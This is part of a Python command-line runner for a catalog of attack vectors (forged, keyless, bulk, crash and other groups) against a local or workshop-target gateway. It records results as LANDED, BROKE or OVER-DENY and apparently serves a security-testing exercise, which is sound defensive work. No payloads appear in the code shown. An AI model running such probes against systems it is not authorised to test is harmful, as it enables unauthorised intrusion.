def saved() -> list[dict]:
    if not SAVED.is_file():
        return []
    try:
        return json.loads(SAVED.read_text())
    except json.JSONDecodeError:
        return []


def catalog() -> list[dict]:
    return _CATALOG + generated() + [{**v, "group": "saved"} for v in saved()]


_SAVE_KEYS = (
    "id",
    "group",
    "title",
    "kind",
    "type",
    "needs_mint",
    "note",
    "mandate",
    "tool",
    "arguments",
    "tweaks",
    "break",
    "demo_mandate",
    "demo_call",
    "path",
)


def save_vector(spec: dict) -> dict:
    clean = {key: spec[key] for key in _SAVE_KEYS if key in spec}
    clean.setdefault("group", "saved")
    clean.setdefault("id", f"saved-{int(time.time())}")
    data = saved()
    data.append(clean)
    SAVED.write_text(json.dumps(data, indent=2))
    return {"saved": len(data), "file": str(SAVED.relative_to(ROOT)), "vector": clean}


# ---------------------------------------------------------------- headless cli


def _out(line: str = "") -> None:
    sys.stdout.write(f"{line}\n")


def _report(findings: list[dict]) -> int:
    width = max((len(f["id"]) for f in findings), default=10)
    problems = 0
    for f in findings:
        if f["error"]:
            _out(f"ERR   {f['id']:<{width}}  {f['error']}")
            continue
        extra = []
        if f["points"]:
            extra.append(f"{f['points']} pts")
        if f["flags"]:
            extra.append(f["flags"][0]["id"])
        if f["breaks"]:
            extra.append("+".join(f["breaks"]))
        tail = f"  ({', '.join(extra)})" if extra else ""
        _out(f"{f['outcome']:<10}{f['id']:<{width}}  HTTP {f['status']} {f['got'] or f['reason'] or ''}{tail}")
        if f["outcome"] in ("LANDED", "BROKE", "OVER-DENY"):
            problems += 1
    _out("")
    _out(f"{len(findings)} vectors, {problems} needing attention")
    return problems


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default="own", help="own, or a folder name under day_2_attack/targets/")
    parser.add_argument(
        "--url", default=os.environ.get("GATEWAY_URL", "http://localhost:8082"), help="gateway URL (own target)"
    )
    parser.add_argument(
        "--group",
        default=None,
        help="run one group only (data, forged, dead, nokey, bulk, crash, keys, aggregate, baseline)",
    )
    parser.add_argument("--list", action="store_true", help="list the vectors and exit")
    args = parser.parse_args(argv)
    if args.list:
        for v in catalog():
            mint = " [own]" if v.get("needs_mint") else ""
            _out(f"{v['group']:<10}{v['id']:<22}{v['title']}{mint}")
        return
    target = load_target(args.target, args.url)
    http = bind_http(target.url or args.url)
    findings = run_group(target, args.group, http) if args.group else run_all(target, http)
    sys.exit(1 if _report(findings) else 0)


if __name__ == "__main__":
    main()
